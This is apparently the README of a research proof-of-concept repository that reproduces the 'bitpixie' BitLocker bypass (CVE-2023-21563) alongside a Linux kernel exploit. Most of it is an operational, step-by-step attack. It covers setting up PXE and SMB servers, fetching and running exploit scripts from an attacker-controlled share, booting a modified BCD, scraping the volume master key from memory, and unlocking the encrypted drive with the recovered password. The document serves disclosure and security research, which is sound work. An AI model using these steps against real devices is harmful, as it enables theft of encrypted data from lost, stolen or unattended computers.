# Bitpixie

> [!note]
> See also the corresponding [Compass Security Blog post](https://blog.compass-security.com/2025/05/bypassing-bitlocker-encryption-bitpixie-poc-and-winpe-edition/)
> for a high-level overview.

The [bitpixie vulnerability](https://github.com/Wack0/bitlocker-attacks?tab=readme-ov-file#bitpixie)
existed since October 2005, was discovered in August 2022 and publicly [disclosed in February 2023 by
Rairii](https://web.archive.org/web/20230501000759/https://haqueers.com/@Rairii/109817927668949732)
after which it was assigned [CVE-2023-21563](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-21563).

The full attack chain was demonstrated by Thomas in his [38C3 talk](https://events.ccc.de/congress/2024/hub/en/event/windows-bitlocker-screwed-without-a-screwdriver/)
which was followed up by two blog posts:

- [Windows BitLocker -- Screwed without a Screwdriver](https://neodyme.io/en/blog/bitlocker_screwed_without_a_screwdriver/)
- [On Secure Boot, TPMs, SBAT, and downgrades -- Why Microsoft hasn't fixed BitLocker yet](https://neodyme.io/en/blog/bitlocker_why_no_fix/)

This repository reproduces the original research performed by Thomas based on his talk and blog posts.
The used Linux kernel exploit ([blog](https://pwning.tech/nftables/),
[PoC](https://github.com/Notselwyn/CVE-2024-1086)) for CVE-2024-1086 was
written by [@notselwyn](https://twitter.com/notselwyn).

Parallel to this work [Andreas Grasser](https://github.com/andigandhi/bitpixie) also 
attempted to reproduce the original research, ending up with a very similar approach.

Beyond simply reproducing the original research this repository also contributes
an alternative WinPE-based exploitation path which might also work if Microsoft's
3rd-party Secure Boot certificate is disabled.

## Prerequisites

BitLocker must be configured without pre-boot authentication also
sometimes referred to as unattended/transparent mode i.e. without a PIN
or a key file.

Booting in PXE mode must be possible. In particular, the UEFI firmware
must have a working TCP/IP stack. If only the network boot option is
disabled, some USB dongles might work around that limitation.

If you have access to the Windows environment, launch an elevated
instance of `msinfo32` the entry *Automatic Device Encryption Support*
should read *Meets prerequisites*.

A TPM 2.0 is needed to support the PCR7 binding
- In Windows open *Device Manager > Security Devices* and check the TPM properties
- Check in the UEFI settings, something like: *Security > Security Chip > Security Chip Selection*.
	
> [!warning]
> Changing the TPM mode will clear the stored keys, therefore:
> 1. Boot Windows, disable BitLocker: `manage-bde -protectors -disable C:`
> 2. Boot into UEFI/BIOS, enable the TPMv2.0 security chip
> 3. Boot Windows, re-enable BitLocker `manage-bde -protectors -enable C:`

Secure Boot needs to be enabled and used for integrity validation.
The command below, must list exactly the PCRs `7, 11`:
```
PS> manage-bde -protectors -get c:
...
      PCR Validation Profile:
        7, 11
        (Uses Secure Boot for integrity validation)
```

> [!warning]
> If the PCR register `4` is included, this attack will not work.

> [!note]
> To make a device intentionally vulnerable a local GPO can be configured:
> 1. Temporarily suspend BitLcoker protection: `manage-bde -protectors -disable C:`
> 2. Create a GPO using `gpedit.msc`
> 	- Open *Computer Configuration > Administrative Templates > Windows Components > BitLocker Drive Encryption > Operating System Drives*
> 	- Enable *Configure TPM startup PIN and PCRs* and enter the *PCR values:* `7, 11`
> 3. Apply the GPO: `gpupdate /force`
> 4. Confirm settings: `gpresult /scope coputer /h gpo.html`
> 5. Re-enable BitLocker: `manage-bde -protectors -enable c:`
 
[KB5025885](https://support.microsoft.com/en-us/topic/kb5025885-how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023-24932-41a975df-beb2-40c1-99a3-b3ff139f832d#bkmk_mitigation_guidelines) must not be installed.

Only systems using a bootloader signed with the 2011 Secure Boot certificate are vulnerable. To check this, mount the boot partition and check the signature of `EFI\Microsoft\Boot\bootmgfw.efi`. This can also be performed using [osslsigncode](https://github.com/mtrojnar/osslsigncode).

If your target device has Microsoft's 3rd-party Secure Boot certificate
disabled, only the WinPE-based exploitation strategy might work, otherwise
both should be applicable.

## Environment Setup

A top level Makefile prepares all needed components. Either run it for a
particular exploitation strategy or prepare both scenarios:

```
make
```

This requires a working Docker setup. For the actual exploitation you will
also need:

 - dnsmasq
 - impacket's smbserver.py
 - GDB with Python support (for the WinPE-based attack strategy)

### Linux Initramfs Generation

An initramfs containing all needed components based on a stripped down
version of [frood, an Alpine initramfs NAS](https://words.filippo.io/dispatches/frood/)
can be generated with:

```
make linux
```

### WinPE Ramdisk

Similarly, the following command will generate a bootable WinPE environment:

```
make winpe
```

> [!note]
> By default this extracts a WinPE environment from the latest Windows 11
> version. Depending on your hardware, older images might yield better
> results.
> 
> See the related [GitHub issue](https://github.com/martanne/bitpixie/issues/3)
> for more information and share your own experience on the
> [corresponding wiki page](https://github.com/martanne/bitpixie/wiki#exploitation-log).

### SMB Server

Start a SMB server from where the attack scripts can be downloaded from
and the resulting, device-specific BCD can be uploaded to. Impacket's
`smbserver.py` works great for that:

```
cd pxe && ./start-smb.sh
```

### PXE Server

Start the PXE server serving the network boot images. For Linux:
```
cd pxe && ./start-pxe-linux.sh eth0
```

WinPE:
```
cd pxe && ./start-pxe-winpe.sh eth0
```

## Attack

### Boot into Recovery Mode

Let Windows boot normally, on the logon screen hold down the *Shift*
key and select the *Restart* option from the power menu.

Windows will reboot into a recovery mode. Select *Troubleshoot > Advanced
Option > Command Prompt*. If desired, select *Change keyboard layout*. When
prompted for BitLocker recovery key, select *Skip this drive*.

You should now be in a command prompt within the recovery environment.

If needed, enable network support:
```
wpeutil initializenetwork
```

> [!note]
> You should see DHCP request served by `dnsmasq`. You can check the ip with `ipconfig` and also try to ping the attack machine `ping 10.13.37.100`.

Mount the exposed SMB share:
```
net use S: \\10.13.37.100\smb
```

Make sure you are in local temp directory:
```
cd %TEMP%
```

> [!note]
> Either continue with the Linux or WinPE based exploitation.

### Linux-based Exploitation

[bitpixie-linux.webm](https://github.com/user-attachments/assets/255b83e0-22a3-4442-9f15-ab3093e2450c)

Copy the attack script to the temporary directory:
```
copy S:\exploit-linux.bat .
```

Execute it to generate a modifed BCD file and upload it to the SMB share
specified with the drive letter:
```
.\exploit-linux.bat S:
```

> [!note]
> The device specific BCD file needs to be served as `Boot\BCD` via PXE.

Exit the command line and chose *Use a device* then select the option
indicating PXE boot (e.g. PCI LAN).

### Boot into Linux Environment

The device should now reboot over PXE, fail to fully load the Windows
boot configuration then fall back to the served Linux environment.

> [!note]
> If you end up on a blank blue screen it might help to press *Escape*
> to show the GRUB boot menu where you can select the Linux system.
> 
> This typically means something did not work as expected.

Login with the `root` user, no password is needed. Follow the instructions
printed in the logon message.  Replace `XYZ` with device file representing
your encrypted BitLocker volume (use `lsblk -f`):

```
exploit && ./mount.sh /dev/XYZ && ls mnt
```

### WinPE-based Exploitation

> [!warning]
> The WinPE-based approach seems to be less reliable than its Linux-based
> counterpart. Exploitation success seems to vary based on the involved
> hardware and the used WinPE image.
>
> More information can be found in the following
> [GitHub issue](https://github.com/martanne/bitpixie/issues/3).

[bitpixie-winpe.webm](https://github.com/user-attachments/assets/c9431354-7c3f-4a22-8fc8-2c300cc77410)

For the WinPE-based exploitation strategy, two BCD files will be needed.

```
copy S:\exploit-winpe1.bat .
```

Upload the generated BCD files to the specified share:

```
.\exploit-winpe1.bat S:
```

Exit the command line and chose *Use a device* then select the option
indicating PXE boot (e.g. PCI LAN).

### Boot into WinPE

The device should now reboot over PXE, fail to fully load the Windows
boot configuration then fall back to the served WinPE system.

Reconnect the SMB share, download the attack script and start the second
part of the exploitation:

```
cd %temp%
net use S: \\10.13.37.100\smb
copy S:\exploit-winpe2.bat .
.\exploit-winpe2.bat S:
```

> [!note]
> Alternatively, the necessary tooling can also be copied to the external
> storage. This avoids the need for a network connection and might change
> the internal memory layout.

This will search physical memory for a volume master key (VMK) using a
modified version of [WinPmem](https://github.com/martanne/WinPmem-BitLocker).
If successful, a `vmk-*.dat` file should now exists in the current directory.

The next step is to determine the byte offset of the encrypted partition
relative to the start of the disk. This information can be queried as
follows:

```
c:\> diskpart
diskpart> list disk
diskpart> select disk 0
diskpart> detail disk
diskpart> list partition
diskpart> select partition 3
diskpart> detail partition
...
Offset in Bytes: 1234
...
diskpart> exit

```

> [!note]
> Select the disk and partition indices corresponding to your system.

Once you have have the disk index, partion offset as well as the VMK file,
you can run the following command to hopefully print the BitLocker recovery
password in human readable form:

```
dislocker-metadata.exe -V \\.\PhysicalDrive0 -K vmk-*.dat -o 1234
```

> [!warning]
> Capitalization of `PhysicalDrive` matters!

Using the recovery password the encrypted volume can be unlocked:

```
manage-bde -unlock C: -RecoveryPassword 123456-789012-345678-901234-567890-123456
```

> [!warning]
> Depending on the used WinPE image, BitLocker support might not be
> available.
> 
> In that case it is recommended to once more boot into the native
> recovery environment where the disk can be unlocked through the GUI
> by providing the recovery password.
